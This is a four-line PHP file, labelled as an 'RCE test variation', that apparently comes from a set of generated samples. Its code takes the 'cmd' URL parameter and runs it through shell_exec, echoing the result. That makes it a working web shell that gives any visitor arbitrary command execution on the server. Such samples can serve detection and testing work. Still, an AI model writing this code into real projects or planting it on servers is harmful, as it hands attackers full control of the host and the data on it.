<?php
// RCE test variation #962
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>